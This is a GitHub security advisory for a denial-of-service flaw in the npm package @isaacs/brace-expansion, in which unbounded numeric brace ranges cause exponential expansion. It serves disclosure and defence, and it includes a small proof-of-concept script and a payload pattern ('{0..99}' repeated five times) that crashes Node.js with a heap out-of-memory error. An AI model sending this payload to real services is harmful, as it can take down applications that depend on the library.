# [H] @isaacs/brace-expansion has Uncontrolled Resource Consumption

## Summary
Severity: High
Advisory: GHSA-7h2j-956f-4vf2
CVE: CVE-2026-25547
CWE: CWE-1333
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-02-03
Source: https://github.com/advisories/GHSA-7h2j-956f-4vf2
Type: github-advisory

## Affected
- npm: `@isaacs/brace-expansion` — affected >=0 <5.0.1

## Details
### Summary

`@isaacs/brace-expansion` is vulnerable to a Denial of Service (DoS) issue caused by unbounded brace range expansion. When an attacker provides a pattern containing repeated numeric brace ranges, the library attempts to eagerly generate every possible combination synchronously. Because the expansion grows exponentially, even a small input can consume excessive CPU and memory and may crash the Node.js process.

### Details

The vulnerability occurs because `@isaacs/brace-expansion` expands brace expressions without any upper bound or complexity limit. Expansion is performed eagerly and synchronously, meaning the full result set is generated before returning control to the caller.

For example, the following input:

```
{0..99}{0..99}{0..99}{0..99}{0..99}
```

produces:

```
100^5 = 10,000,000,000 combinations
```

This exponential growth can quickly overwhelm the event loop and heap memory, resulting in process termination.

### Proof of Concept

The following script reliably triggers the issue.

Create `poc.js`:

```js
const { expand } = require('@isaacs/brace-expansion');

const pattern = '{0..99}{0..99}{0..99}{0..99}{0..99}';

console.log('Starting expansion...');
expand(pattern);
```

Run it:

```bash
node poc.js
```

The process will freeze and typically crash with an error such as:

```
FATAL ERROR: JavaScript heap out of memory
```

### Impact

This is a denial of service vulnerability. Any application or downstream dependency that uses `@isaacs/brace-expansion` on untrusted input may be vulnerable to a single-request crash.

An attacker does not require authentication and can use a very small payload to:

* Trigger exponential computation
* Exhaust memory and CPU resources
* Block the event loop
* Crash Node.js services relying on this library

## References
- https://github.com/isaacs/brace-expansion/security/advisories/GHSA-7h2j-956f-4vf2
- https://nvd.nist.gov/vuln/detail/CVE-2026-25547
- https://github.com/isaacs/brace-expansion
